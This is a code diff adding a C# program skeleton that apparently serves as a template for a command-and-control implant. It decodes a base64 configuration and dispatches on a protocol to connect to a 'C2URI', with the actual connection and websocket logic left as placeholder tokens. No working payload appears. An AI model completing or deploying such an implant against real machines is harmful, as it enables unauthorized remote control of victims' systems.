@@ -1,0 +1,47 @@
+using System;
+using System.IO;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Text.Json;
+using System.Collections.Generic;
+using System.Net;
+using System.Net.Sockets;
+using System.Net.WebSockets;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace Tehsat
+{
+    public class Program
+    {
+
+        public static void Main()
+        {
+
+            string configurations_b64 = "CONFIGURATION_CONTEXT" ;
+            string configurations_json = Encoding.UTF8.GetString(Convert.FromBase64String(configurations_b64));
+
+            Dictionary<string, Configuration> configurations = JsonSerializer.Deserialize<Dictionary<string, Configuration>>(configurations_json);
+
+            foreach (var c in configurations)
+            {
+                switch (c.Value.PROTOCOL)
+                {
+CONDITION_CONTEXT                    
+
+                    default:
+                        Console.WriteLine("{0} couldn't start", c.Value.C2URI);
+                        break;
+                }
+
+            }
+            
+        }
+
+    }
+
+CONFIGURATION_CLASS_CONTEXT
+
+WEBSOCKET_CONTEXT
+
+}
